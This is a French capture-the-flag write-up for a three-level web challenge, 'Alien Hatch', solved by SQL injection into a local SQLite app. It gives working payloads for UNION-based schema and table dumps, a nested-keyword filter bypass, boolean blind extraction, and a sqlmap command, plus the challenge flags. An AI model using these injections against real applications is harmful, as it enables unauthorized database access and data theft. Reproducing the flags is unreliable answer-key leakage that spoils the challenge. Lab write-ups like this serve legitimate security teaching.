# Writeup : Alien Hatch

Challenge Web / Pentest à 3 niveaux, tous basés sur une SQL injection dans le
mécanisme de nourrissage, mais de difficulté croissante. Chaque niveau possède
sa propre base SQLite isolée : l'injection facile du niveau 1 ne permet donc pas
de lire les flags des niveaux 2 et 3.

| Niveau | Endpoint | Technique | Flag |
|--------|----------|-----------|----------------|
| 1 (facile)   | `POST /feed`  | UNION-based, sortie visible | `CYBN{z0rglub_r0t_c0sm1qu3}` |
| 2 (corsée)   | `POST /feed2` | UNION + contournement de filtre | `CYBN{f1ltr3_anti_bav3_c0ntourn3}` |
| 3 (difficile)  | `POST /feed3` | Blind boolean-based | `CYBN{bl1nd_zorglub_sil3nci3ux}` |

Paramètre injectable dans les trois cas : `food`.
Requête type : `SELECT name, calories, yumminess FROM foods WHERE name = '<food>'`

---

## Reconnaissance (commune aux 3 niveaux)

Le joueur n'a **pas besoin de connaître** le nom de la table (`secrets`) ni des
colonnes (`label`, `value`) : il les découvre.

1. **Détecter l'injection.** Donner un aliment avec une apostrophe (`Nebulonite'`) :
   Zorglub régurgite l'erreur SQLite brute, visible dans le journal / champ `vomit` :
```
unrecognized token: "'Nebulonite''"
```
   → c'est bien du SQLite injectable.

2. **Compter les colonnes.** La requête sélectionne 3 colonnes ; un `UNION SELECT`
   avec un autre nombre de colonnes renvoie une erreur. Ici : **3**.

3. **Lire le schéma** via la table système `sqlite_master` :
```
x' UNION SELECT sql,0,0 FROM sqlite_master-- -
```
   Renvoie les `CREATE TABLE`, dont :
```
CREATE TABLE secrets (id INTEGER PRIMARY KEY, label TEXT, value TEXT)
```

4. **Dump** sans même connaître `label='drapeau'` :
```
x' UNION SELECT label||'='||value,0,0 FROM secrets-- -
```
   → `drapeau=CYBN{z0rglub_r0t_c0sm1qu3}` (+ une ligne de bruit).

Le schéma est **identique** dans les trois bases isolées : les noms trouvés ici
servent aussi aux niveaux 2 et 3. Pour le niveau 2, la même lecture de
`sqlite_master` fonctionne avec les mots-clés imbriqués
(`x' UNIunionON SELselectECT sql,0,0 FROM sqlite_master-- -`).

---

## Niveau 1 : UNION-based (sortie visible)

1. Donner un aliment avec une apostrophe (`Nebulonite'`) : indigestion, l'erreur
   SQLite est renvoyée (`unrecognized token`).
2. La requête renvoie 3 colonnes. Récupération directe :
```
x' UNION SELECT value,0,0 FROM secrets WHERE label='drapeau'-- -
```
Résultat : « Zorglub a absorbé : CYBN{z0rglub_r0t_c0sm1qu3} »

---

## Niveau 2 : contournement de filtre

Gamelle 2 (`/feed2`). Un filtre retire les mots `union` et `select`
(insensible à la casse) **en une seule passe**, puis concatène dans la requête.

- L'injection directe échoue :
```
x' UNION SELECT value,0,0 FROM secrets-- -     ->  syntax error
```
- Bypass par imbrication (le filtre retire le mot interne, ce qui en reconstitue un) :
```
x' UNIunionON SELselectECT value,0,0 FROM secrets WHERE label='drapeau'-- -
```
  `UNIunionON` -> (retrait de `union`) -> `UNION` ; `SELselectECT` -> `SELECT`.

Résultat : CYBN{f1ltr3_anti_bav3_c0ntourn3}

---

## Niveau 3 : blind boolean-based

Gamelle 3 (`/feed3`). Aucune donnée ni erreur n'est renvoyée : seulement deux
réactions possibles, qui servent d'oracle booléen :
- rangée trouvée  -> « Zorglub mange avec appétit » (VRAI)
- aucune rangée   -> « Zorglub recrache et refuse » (FAUX)

Oracle avec un aliment valide :
```
Nebulonite' AND 1=1-- -   -> mange   (VRAI)
Nebulonite' AND 1=2-- -   -> refuse  (FAUX)
```

Extraction caractère par caractère (recherche binaire) :
```
Nebulonite' AND length((SELECT value FROM secrets WHERE label='drapeau'))=N-- -
Nebulonite' AND unicode(substr((SELECT value FROM secrets WHERE label='drapeau'),i,1))>M-- -
```

Résultat : CYBN{bl1nd_zorglub_sil3nci3ux}

Avec sqlmap :
```bash
sqlmap -u "http://localhost:8010/feed3" --data="food=Nebulonite" \
       --dbms=sqlite --technique=B --dump -T secrets
```

---

## Remarques

- Les trois bases (`/tmp/alien1.db`, `alien2.db`, `alien3.db`) sont recréées à
  chaque démarrage : aucun résidu entre deux sessions.
- Isolation volontaire : un joueur ne peut pas sauter les niveaux, car chaque
  endpoint ne voit que sa propre base.
- Le jeu (œuf, stats, XP, expressions de l'alien) est purement cosmétique côté
  client. Les failles sont 100 % serveur : résolubles directement en curl/sqlmap.

## Script de résolution

`solve.py` résout les trois niveaux d'affilée :
```bash
pip install requests
python solve.py http://localhost:8010
```

## Changer les flags
Variables d'environnement `FLAG1`, `FLAG2`, `FLAG3`, définies dans le `Dockerfile`
(ou surchargées via `docker-compose.yml`). Les trois sont obligatoires :
sans elles, l'application ne démarre pas.
